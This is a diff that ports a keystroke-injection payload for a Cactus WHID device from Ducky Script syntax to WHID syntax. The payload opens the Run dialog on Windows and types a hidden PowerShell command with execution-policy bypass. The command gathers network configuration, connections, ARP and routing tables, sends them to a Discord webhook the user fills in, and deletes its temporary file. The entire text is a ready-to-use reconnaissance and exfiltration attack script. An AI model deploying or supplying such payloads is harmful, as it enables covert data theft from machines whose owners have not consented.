@@ -1,10 +1,8 @@
-REM === Cactus WHID Payload: Network Recon Dump ===
-REM Target: Windows 10/11
-REM Category: Recon & Exfil
-REM Description: Runs ipconfig, netstat, arp, route print and exfils to Discord
-REM Replace: DISCORD_WEBHOOK_URL_HERE with your webhook URL
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -NoP -W Hidden -Exec Bypass -C "$f=\"$env:TEMP\nr.txt\";ipconfig /all > $f; netstat -an >> $f; arp -a >> $f; route print >> $f; $d=Get-Content $f -Raw; $body=@{content=$d.Substring(0,[Math]::Min(1900,$d.Length))}|ConvertTo-Json -Depth 2; Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body; Remove-Item $f"
-ENTER
+Rem: Cactus WHID Payload - Network Recon Dump
+Rem: Target - Windows 10/11
+Rem: Runs ipconfig, netstat, arp, route print and exfils to Discord
+Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
+CustomDelay:1000
+Press:131+114
+CustomDelay:500
+PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$f=\"$env:TEMP\nr.txt\";ipconfig /all > $f; netstat -an >> $f; arp -a >> $f; route print >> $f; $d=Get-Content $f -Raw; $body=@{content=$d.Substring(0,[Math]::Min(1900,$d.Length))}|ConvertTo-Json -Depth 2; Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body; Remove-Item $f"
